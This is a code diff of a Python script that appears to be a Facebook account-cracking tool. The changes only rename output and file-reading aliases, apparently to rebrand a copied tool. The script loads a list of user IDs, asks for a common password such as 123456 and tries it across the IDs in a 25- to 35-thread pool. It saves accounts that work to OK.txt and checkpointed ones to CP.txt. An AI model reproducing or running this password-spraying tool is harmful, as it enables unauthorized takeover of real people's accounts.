@@ -119,11 +119,11 @@ def banner():
 	logo()
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
-		JULKAR_NAYEN('\n\n\033[0m The Prosess Done...')
-		JULKAR_NAYEN('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
-		#JULKAR_NAYEN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
+		IMTIAZ_AKING('\n\n\033[0m The Prosess Done...')
+		IMTIAZ_AKING('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
+		#IMTIAZ_AKING('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
 	else:
-		JULKAR_NAYEN('\n\033[0mUps..Tidak Mendapatkan Hasil')
+		IMTIAZ_AKING('\n\033[0mUps..Tidak Mendapatkan Hasil')
 		exit()
 class __crack__:
 	def __init__(self):
@@ -132,11 +132,11 @@ class __crack__:
 		try:
 			self.apk = input(" [*] File Name : ")
 			print (' [*]=============================================')
-			self.id = JULKAR(self.apk).read().splitlines()
-			JULKAR_NAYEN(' [*] Total ID : %s'%(len(self.id)))
+			self.id = IMTIAZ(self.apk).read().splitlines()
+			IMTIAZ_AKING(' [*] Total ID : %s'%(len(self.id)))
 			print (' [✓] Are You Went To Continue : Type Y')
 		except:
-			JULKAR_NAYEN('\n [!] File Not Found In Storage')
+			IMTIAZ_AKING('\n [!] File Not Found In Storage')
 			input('\n [*] Press Enter To Back');readline___Public_Xml();print("[M] Menual Password ");print('[D] Default Password ')
      
 		_jokowi_kontol_ = input(" [*] Choose : ")
@@ -146,24 +146,24 @@ class __crack__:
 			IMTIAZ_AKING('\nEnter Password 123456 or 123456789 For OLd Idz ')
 			while True:
 				pwek = input('\nEnter Password : ')
-				#JULKAR_NAYEN('Sandi > %s'%(pwek))
+				#IMTIAZ_AKING('Sandi > %s'%(pwek))
 				if pwek == '':
-					JULKAR_NAYEN('\nJangan Kosong')
+					IMTIAZ_AKING('\nJangan Kosong')
 					time.sleep(1)
 					exit()
 				elif len(pwek)<=5:
-					JULKAR_NAYEN('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
+					IMTIAZ_AKING('\nSandi Harus 6 Karakter Lebih Tidak Masalah')
 				else:
 					def _sempak_(bse=None):
 						boy = input('\nPilih : ')
 						if boy == '':
-							JULKAR_NAYEN('\nJangan Kosong')
+							IMTIAZ_AKING('\nJangan Kosong')
 							time.sleep(1);self._sempak_()
 						elif boy == "1" or boy == "01":
-							JULKAR_NAYEN('\n[•] Result OK saved to OK.txt')
-							JULKAR_NAYEN('[•] Result CP saved to CP.txt')
-							JULKAR_NAYEN('\n\tCrack Processing...\n')
-							JULKAR_NAYEN('\n\tCrack Processing...\n\n');logo()
+							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
+							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
+							IMTIAZ_AKING('\n\tCrack Processing...\n')
+							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
@@ -174,9 +174,9 @@ class __crack__:
 							os.remove(self.apk)
 							hasil(ok,cp)
 						elif boy == "2" or boy == "02":
-							JULKAR_NAYEN('\n[•] Result OK saved to OK.txt')
-							JULKAR_NAYEN('[•] Result CP saved to CP.txt')
-							JULKAR_NAYEN('\n\tCrack Processing...\n\n');logo()
+							IMTIAZ_AKING('\n[•] Result OK saved to OK.txt')
+							IMTIAZ_AKING('[•] Result CP saved to CP.txt')
+							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
 							with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
 								for ikeh in self.id:
 									try:
